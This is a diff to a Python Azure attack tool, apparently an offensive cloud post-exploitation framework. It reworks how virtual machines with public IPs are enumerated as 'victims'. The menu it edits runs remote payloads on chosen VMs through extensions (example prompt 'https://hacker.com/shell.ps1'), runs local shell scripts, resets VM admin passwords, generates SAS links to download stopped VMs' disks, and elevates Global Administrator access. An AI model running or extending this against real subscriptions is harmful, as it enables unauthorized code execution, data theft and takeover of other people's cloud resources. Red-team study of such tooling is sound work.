@@ -1326,9 +1326,14 @@ def RD_DumpRunBookContent(runbookGUID):
         result = None
     return result
 
+def HLP_GetAzVMPublicIPNew(networkGuid):
+    global Token
+    r = sendGETRequest("https://management.azure.com/"+networkGuid+"?api-version=2022-05-01", Token)
+    return r['json']
+
 def HLP_GetAzVMPublicIP(subscriptionId,resourceGroupName,publicIpAddressName):
     global Token
-    r = sendGETRequest("https://management.azure.com/subscriptions/"+subscriptionId+"/resourceGroups/"+resourceGroupName+"/providers/Microsoft.Network/publicIPAddresses/"+publicIpAddressName+"PublicIP?api-version=2022-01-01", Token)
+    r = sendGETRequest("https://management.azure.com/subscriptions/"+subscriptionId+"/resourceGroups/"+resourceGroupName+"/providers/Microsoft.Network/publicIPAddresses/"+publicIpAddressName+"?api-version=2022-01-01", Token)
     if r["status_code"] == 200:
         if "ipAddress" not in r['json']['properties']:
             result = "N/A"
@@ -2244,31 +2249,38 @@ def attackWindow():
                     rows = []
                     AllVMRecordsCount = 0
                     for UserVMRecord in RD_ListAllVMs():
-                        if UserVMRecord['identity'] == "N/A":
-                            VMIdentity = "N/A"
-                        else:
-                            VMIdentity = UserVMRecord['identity']['type']
-                        if HLP_GetAzVMPublicIP(UserVMRecord['subscriptionId'], UserVMRecord['resourceGroup'],UserVMRecord['name']) == "N/A":
-                            continue
-                        else:
-                            victims[AllVMRecordsCount] = {"name": UserVMRecord['name'],
-                                                          "os": UserVMRecord['properties']['storageProfile']['osDisk']['osType'], "location": UserVMRecord['location'],
-                                                          "subId": UserVMRecord['subscriptionId'],
-                                                          "rg": UserVMRecord['resourceGroup']}
-                            rows.append(
-                                {"#": AllVMRecordsCount,
-                                 "Name": UserVMRecord['name'],
-                                 "Location": UserVMRecord['location'],
-                                 "PublicIP": HLP_GetAzVMPublicIP(UserVMRecord['subscriptionId'],UserVMRecord['resourceGroup'], UserVMRecord['name']),
-                                 "OSType": UserVMRecord['properties']['storageProfile']['osDisk']['osType'],
-                                 "ResourceGroup": UserVMRecord['resourceGroup'],
-                                 "Identity": VMIdentity,
-                                 "SubscriptionId": UserVMRecord['subscriptionId']
-                                 }
-                            )
-                        AllVMRecordsCount += 1
+                        CurrentNetworkInterface = UserVMRecord['properties']['networkProfile']['networkInterfaces']
+                        for nic in CurrentNetworkInterface:
+                            for ip in HLP_GetAzVMPublicIPNew(nic['id'])['properties']['ipConfigurations']:
+                                if 'publicIPAddress' not in ip['properties']:
+                                    continue
+                                else:
+                                    if UserVMRecord['identity'] == "N/A":
+                                        VMIdentity = "N/A"
+                                    else:
+                                        VMIdentity = UserVMRecord['identity']['type']
+                                        
+                                    if HLP_GetAzVMPublicIP(UserVMRecord['subscriptionId'],UserVMRecord['resourceGroup'],ip['properties']['publicIPAddress']['name']) == "N/A":
+                                        continue
+                                    else:
+                                        victims[AllVMRecordsCount] = {"name": UserVMRecord['name'],
+                                                                    "os": UserVMRecord['properties']['storageProfile']['osDisk']['osType'], "location": UserVMRecord['location'],
+                                                                    "subId": UserVMRecord['subscriptionId'],
+                                                                    "rg": UserVMRecord['resourceGroup']}
+                                        rows.append(
+                                            {"#": AllVMRecordsCount,
+                                            "Name": UserVMRecord['name'],
+                                            "Location": UserVMRecord['location'],
+                                            "PublicIP": HLP_GetAzVMPublicIP(UserVMRecord['subscriptionId'],UserVMRecord['resourceGroup'],ip['properties']['publicIPAddress']['name']),
+                                            "OSType": UserVMRecord['properties']['storageProfile']['osDisk']['osType'],
+                                            "ResourceGroup": UserVMRecord['resourceGroup'],
+                                            "Identity": VMIdentity,
+                                            "SubscriptionId": UserVMRecord['subscriptionId']
+                                            }
+                                        )
+                                    AllVMRecordsCount += 1
                     print(make_table(field_names, rows))
-                    TargetVM = input("Select Target VM Name [i.e. 1]: ")
+                    TargetVM = input("Select Target VM Name [i.e. 0]: ")
                     Selection = int(TargetVM)
                     CmdVMPath = input("Enter Path for Script [i.e. C:\exploit\shell.ps1]: ")
                     try:
@@ -2292,94 +2304,121 @@ def attackWindow():
                             VMState = HLP_GetVMInstanceView(UserVMRecord['subscriptionId'],UserVMRecord['resourceGroup'],UserVMRecord['name'])
                             if VMState != "PowerState/deallocated":
                                 continue
-                            victims[AllVMRecordsCount] = {"name": UserVMRecord['name'], "location": UserVMRecord['location'], "diskName": UserVMRecord['properties']['storageProfile']['osDisk']['name'],"subId": UserVMRecord['subscriptionId'],"rg": UserVMRecord['resourceGroup']}
-                            rows.append(
-                                {"#": AllVMRecordsCount,
-                                 "Name": UserVMRecord['name'],
-                                 "Location": UserVMRecord['location'],
-                                 "DiskName": UserVMRecord['properties']['storageProfile']['osDisk']['name'],
-                                 "VM Status": VMState
-                                 }
-                            )
+                            else:
+                                victims[AllVMRecordsCount] = {"name": UserVMRecord['name'], "location": UserVMRecord['location'], "diskName": UserVMRecord['properties']['storageProfile']['osDisk']['name'],"subId": UserVMRecord['subscriptionId'],"rg": UserVMRecord['resourceGroup']}
+                                rows.append(
+                                    {"#": AllVMRecordsCount,
+                                    "Name": UserVMRecord['name'],
+                                    "Location": UserVMRecord['location'],
+                                    "DiskName": UserVMRecord['properties']['storageProfile']['osDisk']['name'],
+                                    "VM Status": VMState
+                                    }
+                                )
                             AllVMRecordsCount += 1
-                    print(make_table(field_names, rows))
-                    TargetVM = input("Select Target DiskVM [i.e. 1]: ")
-                    print("Create a SAS link for VHD download...")
-                    Selection = int(TargetVM)
-                    print(CON_GenerateVMDiskSAS(victims[Selection]["subId"], victims[Selection]["rg"], victims[Selection]["diskName"]))
+                    if len(rows) > 0:
+                        print(make_table(field_names, rows))
+                        TargetVM = input("Select Target DiskVM [i.e. 0]: ")
+                        print("Create a SAS link for VHD download...")
+                        Selection = int(TargetVM)
+                        print(CON_GenerateVMDiskSAS(victims[Selection]["subId"], victims[Selection]["rg"], victims[Selection]["diskName"]))
+                    else:
+                        print("No deallocated / stopped VMs were found.")
             elif "Contributor/VMExtensionExecution" in ExploitChoosen and mode == "run":
                 print("Trying to list exposed virtual machines.. (it might take a few minutes)")
                 if len(RD_ListAllVMs()) < 1:
                     print("No VMs were found.")
                 else:
                     victims = {}
-                    field_names = ["#", "Name", "Location", "PublicIP", "adminUsername", "ResourceGroup",
-                                                "SubscriptionId"]
+                    field_names = ["#", "Name", "Location", "PublicIP", "adminUsername", "ResourceGroup","SubscriptionId"]
                     rows = []
                     AllVMRecordsCount = 0
                     for UserVMRecord in RD_ListAllVMs():
-                        if HLP_GetAzVMPublicIP(UserVMRecord['subscriptionId'], UserVMRecord['resourceGroup'],UserVMRecord['name']) == "N/A":
-                            continue
-                        else:
-                            victims[AllVMRecordsCount] = {"name": UserVMRecord['name'],
-                                                          "username": UserVMRecord['properties']['osProfile']['adminUsername'],
-                                                          "location": UserVMRecord['location'],
-                                                          "subId": UserVMRecord['subscriptionId'],
-                                                          "rg": UserVMRecord['resourceGroup']}
-                            rows.append(
-                                {"#": AllVMRecordsCount,
-                                 "Name": UserVMRecord['name'],
-                                 "Location": UserVMRecord['location'],
-                                 "PublicIP": HLP_GetAzVMPublicIP(UserVMRecord['subscriptionId'],
-                                                                      UserVMRecord['resourceGroup'], UserVMRecord['name']),
-                                 "adminUsername": UserVMRecord['properties']['osProfile']['adminUsername'],
-                                 "ResourceGroup": UserVMRecord['resourceGroup'],
-                                 "SubscriptionId": UserVMRecord['subscriptionId']
-                                 }
-                            )
-                            AllVMRecordsCount += 1
-                    print(make_table(field_names, rows))
-                    TargetVM = input("Select Target VM Name [i.e. 1]: ")
-                    RemotePayload = input("Enter Remote Payload [i.e. https://hacker.com/shell.ps1]: ")
-                    Selection = int(TargetVM)
-                    print(CON_VMExtensionExecution(victims[Selection]["subId"], victims[Selection]["location"],
-                                                  victims[Selection]["rg"], victims[Selection]["name"], RemotePayload))
+                        CurrentNetworkInterface = UserVMRecord['properties']['networkProfile']['networkInterfaces']
+                        for nic in CurrentNetworkInterface:
+                            for ip in HLP_GetAzVMPublicIPNew(nic['id'])['properties']['ipConfigurations']:
+                                if 'publicIPAddress' not in ip['properties']:
+                                    continue
+                                else:
+                                    if UserVMRecord['identity'] == "N/A":
+                                        VMIdentity = "N/A"
+                                    else:
+                                        VMIdentity = UserVMRecord['identity']['type']
+                                        
+                                    if HLP_GetAzVMPublicIP(UserVMRecord['subscriptionId'],UserVMRecord['resourceGroup'],ip['properties']['publicIPAddress']['name']) == "N/A":
+                                        continue
+                                    else:
+                                        victims[AllVMRecordsCount] = {"name": UserVMRecord['name'],
+                                                                    "username": UserVMRecord['properties']['osProfile']['adminUsername'], 
+                                                                    "location": UserVMRecord['location'],
+                                                                    "subId": UserVMRecord['subscriptionId'],
+                                                                    "rg": UserVMRecord['resourceGroup']}
+                                        rows.append(
+                                            {"#": AllVMRecordsCount,
+                                            "Name": UserVMRecord['name'],
+                                            "Location": UserVMRecord['location'],
+                                            "PublicIP": HLP_GetAzVMPublicIP(UserVMRecord['subscriptionId'],UserVMRecord['resourceGroup'],ip['properties']['publicIPAddress']['name']),
+                                            "adminUsername": UserVMRecord['properties']['osProfile']['adminUsername'],
+                                            "ResourceGroup": UserVMRecord['resourceGroup'],
+                                            "SubscriptionId": UserVMRecord['subscriptionId']
+                                            }
+                                        )
+                                    AllVMRecordsCount += 1
+                    if len(rows) > 0:
+                        print(make_table(field_names, rows))
+                        TargetVM = input("Select Target VM Name [i.e. 0]: ")
+                        RemotePayload = input("Enter Remote Payload [i.e. https://hacker.com/shell.ps1]: ")
+                        Selection = int(TargetVM)
+                        print(CON_VMExtensionExecution(victims[Selection]["subId"], victims[Selection]["location"],
+                                                    victims[Selection]["rg"], victims[Selection]["name"], RemotePayload))
+                    else:
+                        print("No VMs with public IP were found.")
             elif "Contributor/VMExtensionResetPwd" in ExploitChoosen and mode == "run":
                 print("Trying to list exposed virtual machines.. (it might take a few minutes)")
                 if len(RD_ListAllVMs()) < 1:
                     print("No VMs were found.")
                 else:
                     victims = {}
-                    field_names = ["#", "Name", "Location", "PublicIP", "adminUsername", "ResourceGroup",
-                                   "SubscriptionId"]
+                    field_names = ["#", "Name", "Location", "PublicIP", "adminUsername", "ResourceGroup","SubscriptionId"]
                     rows = []
                     AllVMRecordsCount = 0
                     for UserVMRecord in RD_ListAllVMs():
-                        if HLP_GetAzVMPublicIP(UserVMRecord['subscriptionId'], UserVMRecord['resourceGroup'],
-                                               UserVMRecord['name']) == "N/A":
-                            continue
-                        else:
-                            victims[AllVMRecordsCount] = {"name": UserVMRecord['name'],
-                                                          "username": UserVMRecord['properties']['osProfile']['adminUsername'],
-                                                          "location": UserVMRecord['location'],
-                                                          "subId": UserVMRecord['subscriptionId'],
-                                                          "rg": UserVMRecord['resourceGroup']}
-                            rows.append(
-                                {"#": AllVMRecordsCount,
-                                 "Name": UserVMRecord['name'],
-                                 "Location": UserVMRecord['location'],
-                                 "PublicIP": HLP_GetAzVMPublicIP(UserVMRecord['subscriptionId'],
-                                                                 UserVMRecord['resourceGroup'], UserVMRecord['name']),
-                                 "adminUsername": UserVMRecord['properties']['osProfile']['adminUsername'],
-                                 "ResourceGroup": UserVMRecord['resourceGroup'],
-                                 "SubscriptionId": UserVMRecord['subscriptionId']
-                                 }
-                            )
-                            AllVMRecordsCount += 1
-                    print(make_table(field_names, rows))
-                    TargetVM = input("Select Target VM Name [i.e. 1]: ")
-                    Selection = int(TargetVM)
-                    print(CON_VMExtensionResetPwd(victims[Selection]["subId"],victims[Selection]["location"],victims[Selection]["rg"],victims[Selection]["name"], victims[Selection]["username"]))
+                        CurrentNetworkInterface = UserVMRecord['properties']['networkProfile']['networkInterfaces']
+                        for nic in CurrentNetworkInterface:
+                            for ip in HLP_GetAzVMPublicIPNew(nic['id'])['properties']['ipConfigurations']:
+                                if 'publicIPAddress' not in ip['properties']:
+                                    continue
+                                else:
+                                    if UserVMRecord['identity'] == "N/A":
+                                        VMIdentity = "N/A"
+                                    else:
+                                        VMIdentity = UserVMRecord['identity']['type']
+                                        
+                                    if HLP_GetAzVMPublicIP(UserVMRecord['subscriptionId'],UserVMRecord['resourceGroup'],ip['properties']['publicIPAddress']['name']) == "N/A":
+                                        continue
+                                    else:
+                                        victims[AllVMRecordsCount] = {"name": UserVMRecord['name'],
+                                                                    "username": UserVMRecord['properties']['osProfile']['adminUsername'], 
+                                                                    "location": UserVMRecord['location'],
+                                                                    "subId": UserVMRecord['subscriptionId'],
+                                                                    "rg": UserVMRecord['resourceGroup']}
+                                        rows.append(
+                                            {"#": AllVMRecordsCount,
+                                            "Name": UserVMRecord['name'],
+                                            "Location": UserVMRecord['location'],
+                                            "PublicIP": HLP_GetAzVMPublicIP(UserVMRecord['subscriptionId'],UserVMRecord['resourceGroup'],ip['properties']['publicIPAddress']['name']),
+                                            "adminUsername": UserVMRecord['properties']['osProfile']['adminUsername'],
+                                            "ResourceGroup": UserVMRecord['resourceGroup'],
+                                            "SubscriptionId": UserVMRecord['subscriptionId']
+                                            }
+                                        )
+                                    AllVMRecordsCount += 1
+                    if len(rows) > 0:
+                        print(make_table(field_names, rows))
+                        TargetVM = input("Select Target VM Name [i.e. 0]: ")
+                        Selection = int(TargetVM)
+                        print(CON_VMExtensionResetPwd(victims[Selection]["subId"],victims[Selection]["location"],victims[Selection]["rg"],victims[Selection]["name"], victims[Selection]["username"]))
+                    else:
+                        print("No VMs with public IP were found.")
             elif "GlobalAdministrator/elevateAccess" in ExploitChoosen and mode == "run":
                 print("Elevating access to the root management group..")
                 print(GA_ElevateAccess())
